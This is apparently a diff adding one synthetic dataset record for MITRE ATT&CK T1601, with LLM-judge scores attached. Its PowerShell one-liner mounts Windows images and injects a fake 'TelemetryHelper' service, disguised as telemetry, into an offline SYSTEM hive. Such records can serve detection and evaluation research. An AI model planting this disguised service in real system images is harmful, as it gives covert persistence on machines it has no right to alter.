@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; reg load HKLM\\BASESYS C:\\Mount\\Base\\Windows\\System32\\Config\\SYSTEM >$null; reg load HKLM\\OFFSYS C:\\Mount\\Win\\Windows\\System32\\Config\\SYSTEM >$null; New-Item -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Force | Out-Null; New-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Name \"ImagePath\" -Value \"\\SystemRoot\\System32\\svchost.exe -k netsvcs -s TelemetryHelper\" -PropertyType ExpandString -Force | Out-Null; $b=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\BASESYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); $m=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); Compare-Object $b $m",
+  "explanation": "Creates a new service entry in the offline SYSTEM hive of the image and compares the list of services with the clean baseline to validate the injected service.",
+  "rationale_steps": [
+    "Mount images and load SYSTEM hives (Admin).",
+    "Create a new service in the modified image's registry.",
+    "Enumerate and Compare-Object the service names between baseline and modified."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-7e94b93b",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell one-liner with balanced quotes, valid DISM/reg/cmdlet syntax, proper semicolon separators, and correct registry provider paths.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts WIMs, loads offline SYSTEM hives, injects a new service key, and compares against a clean baseline (aligned with T1601), but lacks commit/unload steps and requires administrative privileges and additional service parameters for a fully functional service.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-02T20:05:07.010886Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with valid DISM flags, registry operations, and pipeline usage, though mixing semicolons as separators between DISM CLI commands and PowerShell cmdlets in a single session may cause parsing issues depending on execution context.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by mounting a clean and modified WIM image offline, injecting a fake service ('TelemetryHelper') into the modified image's SYSTEM hive to mimic a legitimate telemetry service, and then performing a differential comparison against the clean baseline to validate the injected persistence mechanism—fully consistent with offline firmware/image tampering and backdoor insertion.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T01:26:32.265498Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command sequence is well-formed, using correct DISM flags, proper registry provider paths in PowerShell, and valid command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements the technique by mounting WIM files and injecting a service into an offline registry hive, though it lacks the necessary 'dism /Unmount-Image /Commit' step to persist changes and incorrectly lists 'None' for required privileges.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:26:41.656677Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
